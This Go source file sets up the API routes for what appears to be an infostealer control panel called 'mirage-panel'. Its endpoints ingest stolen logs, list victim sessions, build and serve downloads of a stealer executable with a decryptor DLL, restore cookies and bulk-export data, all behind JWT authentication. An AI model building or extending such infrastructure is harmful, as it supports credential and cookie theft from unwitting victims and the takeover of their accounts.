package api

import (
	"context"
	"database/sql"
	"net/http"
	"strings"

	"github.com/go-chi/chi/v5"
	"github.com/user/mirage-panel/internal/auth"
	"github.com/user/mirage-panel/internal/middleware"
	"github.com/user/mirage-panel/internal/services"
	"github.com/user/mirage-panel/internal/ws"
)

type ctxKey string

const claimsKey ctxKey = "claims"

func AuthMiddleware(secret string) func(http.Handler) http.Handler {
	return func(next http.Handler) http.Handler {
		return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
			header := r.Header.Get("Authorization")
			if header == "" || !strings.HasPrefix(header, "Bearer ") {
				writeError(w, http.StatusUnauthorized, "missing or invalid authorization header")
				return
			}

			tokenStr := strings.TrimPrefix(header, "Bearer ")
			claims, err := auth.ValidateToken(tokenStr, secret)
			if err != nil {
				writeError(w, http.StatusUnauthorized, "invalid or expired token")
				return
			}

			ctx := context.WithValue(r.Context(), claimsKey, claims)
			ctx = middleware.ContextWithClaims(ctx, claims)
			next.ServeHTTP(w, r.WithContext(ctx))
		})
	}
}

func SetupRoutes(r chi.Router, db *sql.DB, jwtSecret string, _ string, hub *ws.Hub, stealerExe, decryptorDll []byte) {
	authHandler := NewAuthHandler(db, jwtSecret)
	usersHandler := NewUsersHandler(db, jwtSecret)
	statsHandler := NewStatsHandler(db, hub)
	logProc := services.NewLogProcessor(db, hub)
	logsHandler := NewLogsHandler(logProc)
	sessionsHandler := NewSessionsHandler(db)
	searchHandler := NewSearchHandler(db)
	buildHandler := NewBuildHandler(services.NewBuildService(), stealerExe, decryptorDll, db)
	notesHandler := NewNotesHandler(db)
	exportHandler := NewExportHandler(db)
	settingsHandler := NewSettingsHandler(db, jwtSecret)
	restoreHandler := NewRestoreHandler(db)

	r.Group(func(r chi.Router) {
		r.Post("/api/auth/login", authHandler.Login)
		r.Post("/api/auth/register", usersHandler.Register)
	})

	r.Group(func(r chi.Router) {
		r.Use(AuthMiddleware(jwtSecret))

		r.Get("/api/stats", statsHandler.Dashboard)

		r.Get("/api/sessions", sessionsHandler.List)
		r.Get("/api/sessions/{id}", sessionsHandler.Detail)
		r.Delete("/api/sessions/{id}", sessionsHandler.Delete)
		r.Post("/api/sessions/{id}/lock", sessionsHandler.Lock)
		r.Post("/api/sessions/{id}/unlock", sessionsHandler.Unlock)

		r.Get("/api/search", searchHandler.Search)

		r.Post("/api/log", logsHandler.Ingest)
		r.Post("/api/log/chunk", logsHandler.Chunk)
		r.Post("/api/log/complete", logsHandler.CompleteChunked)

		sspHandler := NewSSPHandler(logProc)
		r.Post("/api/log/ssp", sspHandler.ProcessSSP)

		r.Route("/api/build", func(r chi.Router) {
			r.Post("/", buildHandler.Build)
			r.Get("/", buildHandler.List)
			r.Get("/{id}/download", buildHandler.Download)
		})

		r.Get("/api/sessions/{id}/notes", notesHandler.List)
		r.Post("/api/sessions/{id}/notes", notesHandler.Create)
		r.Delete("/api/notes/{id}", notesHandler.Delete)

		r.Get("/api/export/session/{id}", exportHandler.ExportSession)
		r.Post("/api/export/bulk", exportHandler.ExportBulk)

		r.Get("/api/settings", settingsHandler.Get)
		r.Put("/api/settings", settingsHandler.Update)

		r.Post("/api/restore/cookies", restoreHandler.Restore)

		r.With(middleware.RequireRole("admin")).Get("/api/users", usersHandler.List)
		r.With(middleware.RequireRole("admin")).Post("/api/users/invite", usersHandler.CreateInvite)
	})
}
